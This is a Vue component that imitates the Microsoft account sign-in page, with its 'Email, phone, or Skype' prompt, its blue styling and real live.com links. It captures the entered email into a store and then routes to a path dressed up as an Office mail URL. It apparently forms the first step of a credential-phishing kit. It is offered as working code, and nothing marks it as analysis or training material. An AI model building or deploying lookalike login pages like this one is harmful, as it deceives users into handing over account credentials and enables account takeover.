<template>
<div class="backgroundx">
    
<div >
   <v-flex 
   xs12 
   sm12
    md12
    layout
   justify-center

   >
   <v-card class="login" flat > 
      <img src="./ml.svg" alt="" width="110px">
      <br><br>
   <h1>Sign in</h1>
     <v-flex xs12 sm12 md12>
          <v-text-field
          v-model = "Cemail"
            placeholder="Email, phone, or Skype"
          ></v-text-field>
        </v-flex>
        
        <span style="font-size:14px;margin-right:10px;"> No account?</span> <span style="color:#0b68b4;"><a style="font-size:14px;text-decoration:none" href="https://signup.live.com/?lic=1">Create one!</a> </span>
        <br><br>
        <span style="color:#0b68b4;"> <a style="font-size:14px;text-decoration:none" href="https://account.live.com/password/reset"> Can't access your account?</a> </span>
        <br><br>
        <button class="btn" @click="toPass">Next</button>
   </v-card>
   </v-flex>

</div>
</div>
</template>

<script>
 import { mapGetters } from 'vuex'
  export default {
      data() {
    return {
      Cemail: ''
    }
  },
  methods:{
    toPass(){
       this.$store.commit('addEmail', this.Cemail) 
      this.$router.push("/signin-password/account-office-com-src-ym&-lang-en-US&-intl-us&-done-mail.office.com")
    }
  }
}
</script>

<style scoped>
.btn {background: #0b68b4 ; padding: 5px;width: 100px; color: white;float: right;}
h1 {font-size: 25px;}
.backgroundx {height:100vh;background-image: url('./bg2.jpg');background-size: cover;padding: 165px 0px 0px 0px ;}
.login {padding: 40px; height: 350px; width:450px; color: rgb(73, 73, 73); border-radius: 1px;}

  @media (max-width: 991px) { 
.btn {background: #0b68b4 ; padding: 5px;width: 100px; color: white;float: right;}
h1 {font-size: 25px;}
.backgroundx {height:100vh;background-image: url('./bg2.jpg');background-size: cover;padding: 165px 0px 0px 0px ;}
.login {padding: 40px; height: 350px; width:450px; color: rgb(73, 73, 73);}
  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
.btn {background: #0b68b4 ; padding: 5px;width: 100px; color: white;float: right;}
h1 {font-size: 25px;}
.backgroundx {height:100vh;background-image: url('./bg2.jpg');background-size: cover;padding: 130px 20px 0px 20px ;}
.login {padding: 40px; height: 350px; width:450px; color: rgb(73, 73, 73);}
}
</style>
